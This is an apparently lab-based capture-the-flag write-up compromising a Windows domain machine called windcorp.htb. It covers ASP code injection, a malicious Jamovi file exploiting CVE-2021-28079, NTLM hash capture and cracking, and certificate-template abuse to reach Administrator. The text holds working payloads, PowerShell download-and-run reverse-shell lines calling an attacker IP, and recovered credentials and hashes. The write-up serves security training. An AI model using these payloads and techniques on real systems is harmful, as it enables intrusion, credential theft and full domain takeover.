## Enumeration

```bash
$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.102 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 
$ nmap -sC -sV -p$ports 10.10.11.102
```

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
|_ssl-date: 2022-01-30T12:04:52+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49717/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-30T12:04:16
|_  start_date: N/A
```

Ports 135 and 445 are open, run cme for more information on the machine.

```bash
$ crackmapexec smb 10.10.11.102

SMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
```

Together, with the common name from the certificate on port 443 on the nmap results, add all these host names to the local hosts file.

```bash
echo "10.10.11.102 www.windcorp.htb windcorp.htb earth earth.windcorp.htb" | sudo tee -a /etc/hosts
```

## HTTPS

Navigate to `https://www.windcorp.htb/` and find the contact tab. Test the "message" input field on the contact tab for xss. Because it's a https it's very likely that http calls are blocked. Instead use a netcat listener for receiving connections.

```bash
<script src='https://attackip/something'></script>
```

```bash
sudo nc -lnvp 443
# send the message and you'll get a hit
```


 ## Initial Foothold

Because the web app is running on a IIS server and the preview page has the asp extension try to inject some ASP code.

```bash
<% response.write("Testing ASP code injection") %>
<%= 7*7 %> # '=' shorthand for response.write
```

Create a malicious VBScript and use WScript.Shell to execute code.

```bash
<%= CreateObject("Wscript.Shell").exec("whoami").StdOut.ReadAll() %> # only use double quotes
```

Send the payload and review the message field which will contain the output text

```text
Message: 	nt authority\system 
```

## ASP Code Injection RCE


```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).download String('http://attackip/shell.ps1')").StdOut.ReadAll() %> # only use double quotes
```

For the ps1 reverse shell use nishang's `Invoke-PowerShellTcpOneLine.ps1`

Fortunately there's no AV blocking the shell and we get a reverse shell on the filesystem. 

```powershell
PS C:\windows\system32\inetsrv> whoami
nt authority\system

PS C:\windows\system32\inetsrv> dir /users

Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----        1/30/2022   5:15 AM                Administrator                                    
d-----        5/25/2021  12:05 PM                ContainerAdministrator                           
d-----         4/9/2021  10:37 PM                ContainerUser                                    
d-r---         4/9/2021  10:36 PM                Public 
```

We are in a container enviroment. At `/users/administrator/desktop` there's a certificate request.

```bash
PS C:\users\Administrator\Desktop> gc req.txt
-----BEGIN CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
4TlwpQ==
-----END CERTIFICATE REQUEST-----
```

Decrypt it locally.

```bash
openssl req -in req.txt -noout -text -verify                                       
verify OK
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:a6:9b:4a:ff:85:91:c2:2a:c2:bf:04:3e:ce:15:
                    d2:f6:23:db:c5:f2:82:1e:6a:13:12:f4:b6:fd:b1:
                    32:44:14:24:c7:1b:10:9d:85:15:fe:c6:d8:ac:44:
                    1b:c0:00:51:0e:b8:f5:14:05:62:9b:04:41:c8:1f:
                    66:e1:18:47:c2:7a:78:48:2e:5f:fd:45:10:ae:00:
                    a2:f4:8a:e8:f6:9d:02:ab:1d:0d:43:cc:31:15:b8:
                    89:19:9d:36:a4:8f:70:3e:02:1b:d3:3e:7b:4b:78:
                    48:0d:7f:99:77:dd:c6:ce:70:72:05:9b:70:bd:db:
                    f7:1f:d8:8b:e3:1e:16:89:59:bf:b8:6b:fe:8f:81:
                    39:5c:c4:13:27:7b:93:ac:47:ee:21:73:86:08:84:
                    b9:f3:40:ca:15:52:ac:bb:c0:8d:d5:67:6b:63:4a:
                    1e:92:8a:23:d4:e3:e5:60:fe:7b:f1:ff:f6:0d:c8:
                    46:ac:de:68:c0:fc:34:99:89:cc:ec:a8:3b:c2:34:
                    cd:b8:61:93:aa:aa:65:48:c6:59:90:08:02:b8:5a:
                    ca:3b:1c:cc:21:68:a9:6e:7b:77:2e:dc:fa:45:3a:
                    ff:88:27:d6:a5:b0:d5:ad:f3:17:53:b5:51:22:a4:
                    26:70:59:13:c5:bc:61:6e:d7:1e:79:4a:fb:38:d4:
                    a7:77
                Exponent: 65537 (0x10001)
        Attributes:
            a0:00
    Signature Algorithm: sha256WithRSAEncryption
         6b:ac:75:c1:11:97:70:30:62:4c:0f:87:27:33:07:96:36:9b:
         63:91:72:c9:3a:0b:50:30:09:23:5e:f3:24:bc:46:81:51:54:
         79:5c:5d:61:ed:1b:af:d2:fd:d6:2b:3b:9a:e8:50:f1:2f:6c:
         d8:ac:b5:8b:2d:8f:59:6e:63:8a:de:cc:70:f6:7a:f0:da:e6:
         6d:8c:25:bc:d5:ac:17:ba:5c:67:b2:d8:54:6d:b8:57:9e:ec:
         21:d1:7f:33:3a:11:dc:3a:6a:3b:94:ff:0e:6f:60:37:23:ad:
         c8:a4:27:9a:13:08:a3:8d:65:d5:fd:9c:7c:57:dc:a8:c8:e9:
         5d:cc:1a:1e:2c:7b:6c:29:71:56:86:d6:a2:59:79:bf:6f:b8:
         5f:04:cf:69:a3:45:86:d6:f2:f0:0d:45:17:4f:4d:0d:2a:7c:
         67:c2:4c:c9:51:91:c7:61:6f:1a:b2:77:f6:f2:2b:8e:53:0c:
         28:58:fa:33:71:80:99:db:c7:f8:83:bf:0f:90:7a:24:21:04:
         dd:a9:ae:c5:4d:38:08:81:f0:08:8e:42:d3:84:f6:29:a0:8d:
         e1:4e:b5:d7:63:c3:21:2d:2d:3a:e6:41:8f:c8:1d:60:8b:20:
         05:8b:05:0d:e0:ed:a7:6d:e0:e0:9b:11:e9:2a:2c:12:2b:28:
         e1:39:70:a5
```

Take note of the common name and add it to the hosts file.

```bash
echo "10.10.11.102 softwareportal.windcorp.htb" | sudo tee -a /etc/hosts
```

There's also a chisel.exe on the desktop which we can use to open a tunnel.

```bash
PS C:\users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Ethernet):

   Connection-specific DNS Suffix  . : htb
   Link-local IPv6 Address . . . . . : fe80::bc0e:be96:fb13:edc4%32
   IPv4 Address. . . . . . . . . . . : 172.20.62.109
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 172.20.48.1
```

```bash
# Kali 
chisel server --socks5 --reverse -p 6767

# Windows
.\chisel.exe client 10.10.14.43:6767 R:socks
```

```bash
# modify proxychains conf file to use socks5
socks5 127.0.0.1 1080
```

Scan the gateway host.
```bash
proxychains nmap -sT -Pn -n --top-ports 100 172.20.48.1 -v
```

```bash
PORT    STATE SERVICE
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos-sec
135/tcp open  msrpc
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
```

Enable Proxy-1080 on the web and navigate to http. We get a "404 Not Found". Fix this issue by editing the hosts file properly.

```bash
# remove the previous softwareportal entry 
echo "172.20.48.1 softwareportal.windcorp.htb" | sudo tee -a /etc/hosts
```

Then the web page appears "Windcorp Software-Portal". At the bottom of the page we find links to install different software products.

An example link

```bash
softwareportal.windcorp.htb/install.asp?client=172.20.62.109&software=7z1900-x64.exe
```

It's trying to install the software to the Windows container host.

To understand what happens behind the scenes open wireshark on tun0, replace the "client" field with our address (tun0) and hit the link. We see through the request that the "src port" is 5985 (winrm). This porbably means that "install.asp" is calling winrm to install the software.

To intercept the user account that attempts this winrm connection with responder.

```bash
sudo responder -I tun0
```

```bash
proxychains curl softwareportal.windcorp.htb/install.asp?client=10.10.14.44&software=7z1900-x64.exe
```

After a while we capture a NTLMv2 hash from localadmin.
```bash
[WinRM] NTLMv2 Client   : ::ffff:10.10.11.102
[WinRM] NTLMv2 Username : windcorp\localadmin
[WinRM] NTLMv2 Hash     : localadmin::windcorp:5b433fb468d74426:C89EDACFEDDFDF8CCC43566643013CA7:0101000000000000E3A6AD23F715D801B75130A101EE2297000000000200080036004E005A00460001001E00570049004E002D004100430041004A0043005800300058004600550046000400140036004E005A0046002E004C004F00430041004C0003003400570049004E002D004100430041004A0043005800300058004600550046002E0036004E005A0046002E004C004F00430041004C000500140036004E005A0046002E004C004F00430041004C0008003000300000000000000000000000002100002173FE7CFB71082C80F6EEEB287AF563F563DE9B7E2FC3B377A156F2A076C6340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00340033000000000000000000
```

After cracking the hash with hashcat we have our creds `localadmin:Secret123`

```bash
$ crackmapexec smb windcorp.htb -u localadmin -p 'Secret123' --shares
SMB         windcorp.htb    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
SMB         windcorp.htb    445    EARTH            [+] windcorp.htb\localadmin:Secret123 
SMB         windcorp.htb    445    EARTH            [+] Enumerated shares
SMB         windcorp.htb    445    EARTH            Share           Permissions     Remark
SMB         windcorp.htb    445    EARTH            -----           -----------     ------
SMB         windcorp.htb    445    EARTH            ADMIN$                          Remote Admin                                                                                            
SMB         windcorp.htb    445    EARTH            C$                              Default share                                                                                           
SMB         windcorp.htb    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share                                                             
SMB         windcorp.htb    445    EARTH            IPC$            READ            Remote IPC
SMB         windcorp.htb    445    EARTH            NETLOGON        READ            Logon server share                                                                                      
SMB         windcorp.htb    445    EARTH            Shared          READ            
SMB         windcorp.htb    445    EARTH            SYSVOL          READ            Logon server share        
```

The only non-default share here is "Shared".

```bash
$ smbclient -U localadmin //10.10.11.102/Shared 


smb: \> recurse ON
smb: \> ls
  .                                   D        0  Wed Apr 28 11:06:06 2021
  ..                                  D        0  Wed Apr 28 11:06:06 2021
  Documents                           D        0  Tue Apr 27 00:09:25 2021
  Software                            D        0  Thu Jul 22 14:14:16 2021

\Documents
  .                                   D        0  Tue Apr 27 00:09:25 2021
  ..                                  D        0  Tue Apr 27 00:09:25 2021
  Analytics                           D        0  Tue Apr 27 14:40:20 2021

\Software
  .                                   D        0  Thu Jul 22 14:14:16 2021
  ..                                  D        0  Thu Jul 22 14:14:16 2021
  7z1900-x64.exe                      N  1447178  Mon Apr 26 17:10:08 2021
  jamovi-1.6.16.0-win64.exe           N 247215343  Mon Apr 26 17:03:30 2021
  VNC-Viewer-6.20.529-Windows.exe      N 10559784  Mon Apr 26 17:09:53 2021

\Documents\Analytics
  .                                   D        0  Tue Apr 27 14:40:20 2021
  ..                                  D        0  Tue Apr 27 14:40:20 2021
  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
  Bugs.omv                            A     2897  Tue Apr 27 14:39:55 2021
  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
  Whatif.omv                          A     2841  Sun Jan 30 13:46:49 2022

                9034239 blocks of size 4096. 3183173 blocks available
```

From there we can download everything locally.

Searching for related vulnerabilities we come across CVE-2021-28079. From the description:

```text
Jamovi <=1.6.18 is affected by a cross-site scripting (XSS) vulnerability. The column-name is vulnerable to XSS in the ElectronJS Framework. An attacker can make a .omv (Jamovi) document containing a payload. When opened by victim, the payload is triggered.
```

Unzip the one of the ".omv" files.

```bash
$ unzip Bugs.omv
Archive:  Bugs.omv
  inflating: META-INF/MANIFEST.MF    
  inflating: index.html              
  inflating: metadata.json           
  inflating: xdata.json              
  inflating: data.bin                
  inflating: 01 empty/analysis
```

Then edit the "metada.json" file and inject a payload into "column-name".
```bash
$ cat metadata.json
{"dataSet": {"rowCount": 93, "columnCount": 8, "removedRows": [], "addedRows": [], "fields": [{"name": "Subject", ...[SNIP]
```

After the XSS code injection
```bash
$ cat metadata.json
{"dataSet": {"rowCount": 93, "columnCount": 8, "removedRows": [], "addedRows": [], "fields": [{"name": "Subject <script>require('child_process').exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43:1234/shell.ps1')</script>", ...[SNIP]
```

Zip everything back together
```bash
zip -r Whatif.omv *
```

```bash
smb: \Documents\Analytics\> put Bugs.omv
putting file Bugs.omv as \Documents\Analytics\Bugs.omv (6.3 kb/s) (average 6.3 kb/s)
smb: \Documents\Analytics\> dir
  .                                   D        0  Tue Apr 27 14:40:20 2021
  ..                                  D        0  Tue Apr 27 14:40:20 2021
  Big 5.omv                           A     6455  Tue Apr 27 14:39:20 2021
  Bugs.omv                            A     3609  Sun Jan 30 14:33:03 2022
  Tooth Growth.omv                    A     2142  Tue Apr 27 14:40:20 2021
  Whatif.omv                          A     2841  Sun Jan 30 14:26:04 2022
```

After a few minutes, a reverse shell as `diegocruz` on the host `earth` is sent to our listener.

```bash
whoami /all
```
We could for field like "Password Last Set" if it's older date we could try to brute force it but it's not in this case

## Privilege Escalation

Let's go back and access the certificate folder on the share

```bash
$ smbclient //10.10.11.102/CertEnroll -U localadmin
```

Amongst all certificate we can find the certificate for the DC
```bash
smb: \> ls
  .                                   D        0  Sun Jan 30 13:32:18 2022
  ..                                  D        0  Sun Jan 30 13:32:18 2022
  earth.windcorp.htb_windcorp-CA.crt      A      897  Mon May 24 13:58:07 2021 <----------- !
  earth.windcorp.thm_windcorp-EARTH-CA.crt      A      885  Thu Feb 25 16:24:00 2021
  nsrev_windcorp-CA.asp               A      322  Tue May 25 16:03:50 2021
  nsrev_windcorp-EARTH-CA.asp         A      328  Tue Apr 27 18:11:32 2021
  windcorp-CA+.crl                    A      722  Sun Jan 30 13:32:18 2022
  windcorp-CA.crl                     A      910  Sun Jan 30 13:32:18 2022
  windcorp-EARTH-CA+.crl              A      734  Mon May 24 13:28:39 2021
  windcorp-EARTH-CA.crl

smb: \> mget earth.windcorp.htb_windcorp-CA.crt
```

From our shell on the `earth` host we list the available certificate templates:

```bash
certutil -catemplates


```

From SharpCollections use Certify and Rubeus and PowerView and ADCS drop them into the Windows host.

```bash

PS C:\programdata> . ./PowerView.ps1
PS C:\programdata> get-domainuser localadmin


userprincipalname : localadmin@windcorp.thm
countrycode       : 0
displayname       : localadmin
samaccounttype    : USER_OBJECT
samaccountname    : localadmin
objectsid         : S-1-5-21-3510634497-171945951-3071966075-3289
objectclass       : {top, person, organizationalPerson, user}
codepage          : 0
givenname         : localadmin
cn                : localadmin
primarygroupid    : 513
distinguishedname : CN=localadmin,OU=systemaccounts,DC=windcorp,DC=htb
name              : localadmin
objectguid        : a197951b-b49e-4850-9216-bf815c0f219a
objectcategory    : CN=Person,CN=Schema,CN=Configuration,DC=windcorp,DC=htb

```


```bash
PS C:\programdata> ./Certify.exe find /vulnerable /currentuser    

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=windcorp,DC=htb'

[*] Listing info about the Enterprise CA 'windcorp-CA'

    Enterprise CA Name            : windcorp-CA
    DNS Hostname                  : earth.windcorp.htb
    FullName                      : earth.windcorp.htb\windcorp-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=windcorp-CA, DC=windcorp, DC=htb
    Cert Thumbprint               : 280458EB20AE6B8A8FFE9B428A5078094F91B3E8
    Cert Serial                   : 3645930A75C5C8BA4AAC0A5C883DEE60
    Cert Start Date               : 5/24/2021 7:48:07 PM
    Cert End Date                 : 5/24/2036 7:58:07 PM
    Cert Chain                    : CN=windcorp-CA,DC=windcorp,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
      Allow  ManageCA, ManageCertificates               WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!

    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290


```

The certificate template `Web` with the Name-Flag set to "ENROLLEE_SUPPLIES_SUBJECT" will allow us to supply the common name to the certificate which is what we can do to identify users.

We can change this template to allow us to authenticate with it as a different user.

```bash
PS C:\programdata> curl http://10.10.14.43:1234/ADCS.ps1 | iex

# Create a smart logon certificate
PS C:\programdata> Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard
# Go to the cert store to see if have the generated the cert
gci cert:\currentuser\my -recurse # get-childitem
# We dont have any (due to a mistake in the build of the box)

# But we can fix the ADCS.ps1 script to get a different property rather than principalname
# Make the following change
# $TargetUPN = $user.samaccountname

PS C:\programdata> Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard
PS C:\programdata> gci cert:\currentuser\my -recurse


   PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my

Thumbprint                                Subject                                                                      
----------                                -------                                                                      
294DC1FC0EBA419AEBC6C65CC9E81C5AAE3D89E6  
```

Next, use the certificate to authenticate as admin and steal his creds.

```bash
PS C:\programdata> ./Rubeus.exe asktgt /user:Administrator /certificate:294DC1FC0EBA419AEBC6C65CC9E81C5AAE3D89E6 /getcredentials

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject:  
[*] Building AS-REQ (w/ PKINIT preauth) for: 'windcorp.htb\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  1/31/2022 12:22:31 AM
  EndTime                  :  1/31/2022 10:22:31 AM
  RenewTill                :  2/7/2022 12:22:31 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Mb9+45ER/HfOvyf1CwmMuQ==
  ASREP (key)              :  5CC0D992B65B9AF2F36B6F8772095144

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09
```

Connect using the NTLM hash with psexec or evil-winrm.

```bash
impacket-psexec -hashes 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09 Administrator@10.10.11.102
```


## The Manual Approach

```bash
# List the available certificate templates
PS C:\programdata> certutil -catemplates
Web: Web -- Auto-Enroll <------------------------ !
DirectoryEmailReplication: Directory Email Replication -- Access is denied.
DomainControllerAuthentication: Domain Controller Authentication -- Access is denied.
KerberosAuthentication: Kerberos Authentication -- Access is denied.
EFSRecovery: EFS Recovery Agent -- Access is denied.
EFS: Basic EFS -- Auto-Enroll: Access is denied.
DomainController: Domain Controller -- Access is denied.
WebServer: Web Server -- Access is denied.
Machine: Computer -- Access is denied.
User: User -- Auto-Enroll: Access is denied.
SubCA: Subordinate Certification Authority -- Access is denied.
Administrator: Administrator -- Access is denied.

```

The user is allowed access to the Web template. We look at the template permissions:

```bash
PS C:\programdata> certutil -v -dstemplate Web

<SNIP>

	Allow Enroll        WINDCORP\Domain Admins
    Allow Enroll        WINDCORP\Enterprise Admins
    Allow Full Control  WINDCORP\Domain Admins
    Allow Full Control  WINDCORP\Enterprise Admins
    Allow Full Control  WINDCORP\Administrator
    Allow Full Control  WINDCORP\webdevelopers
    Allow Read  NT AUTHORITY\Authenticated Users


PS C:\programdata> net group webdevelopers
Group name     webdevelopers
Comment        

Members

-------------------------------------------------------------------------------
DiegoCruz                
The command completed successfully.
```

Users in the `webdevelopers` group have full control over the template and the current user is part of them.

Next, modify the certificate template to make it eligible for smart card logon, then create a certificate request file and submit it to the CA. Finally, configure Kerberos on our attacking machine to use Public Key Cryptography for Initial Authentication (PKINIT) to obtain a ticket that allows us to login to the system as Administrator. 

Run the following to modify the Web template:

```bash
$EKUs=@("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2") Set-ADObject "CN=Web,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=windcorp,DC=htb" -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
```

On Kali run the following script to generate a certificate request:

```bash
cnffile="admin.cnf" 
reqfile="admin.req" 
keyfile="admin.key" 

dn="/DC=htb/DC=windcorp/CN=Users/CN=Administrator" 

cat > $cnffile <
[ req ] 
default_bits = 2048 
prompt = no 
req_extensions = user 
distinguished_name = dn 

[ dn ] 
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@windcorp.htb 

EOF 

openssl req -config $cnffile -subj $dn -new -nodes -sha256 -out $reqfile -keyout $keyfile
```

Three files ( admin.cnf , admin.key , admin.req ) are created. Transfer the admin.req file to the target: 

```bash
curl 10.10.14.43/admin.req -o \programdata\admin.req
```

Submit the request to the CA to generate a client certificate:

```bash
# target host
certreq.exe -submit -config earth.windcorp.htb\windcorp-CA -attrib "CertificateTemplate:Web" admin.req admin.cer
```

The admin.cer file is generated. Copy it to Kali and verify that Smartcard Login is enabled for extended usage.

```bash
openssl x509 -in admin.cer -text -noout | grep -B1 Smartcard
```

Convert the CA certificate downloaded from the CertEnroll share to PEM format:

```bash
openssl x509 -inform DER -in earth.windcorp.htb_windcorp-CA.crt -out ca.cer -text
```

Create a tmp directory and move the relevant certs there:
```bash
mkdir /tmp/anubis; cp admin.cer admin.key ca.cer /tmp/anubis/
```

